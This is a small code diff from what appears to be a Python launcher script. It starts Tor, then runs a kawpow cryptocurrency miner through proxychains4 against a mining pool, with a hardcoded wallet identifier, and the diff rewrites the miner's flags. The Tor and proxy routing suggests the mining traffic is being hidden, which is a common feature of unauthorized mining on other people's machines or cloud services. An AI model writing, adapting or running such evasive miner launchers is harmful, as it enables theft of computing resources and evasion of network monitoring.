@@ -33,4 +33,4 @@ except:
     pass
 os.system('tor &')
 time.sleep(60)
-os.system ('proxychains4 ' + program + ' --algo kawpow --server stratum+ssl://stratum-na.rplant.xyz:17029 --user NUZKH3x3fDb4iFsHgSVqpvbd38k6rRcX5K.ml -p x ' )
+os.system ('proxychains4 ' + program + ' -a kawpow -p stratum+ssl://stratum-na.rplant.xyz:17029 -w NUZKH3x3fDb4iFsHgSVqpvbd38k6rRcX5K.ml --pool_password webpassword=x --nc 1 ' )
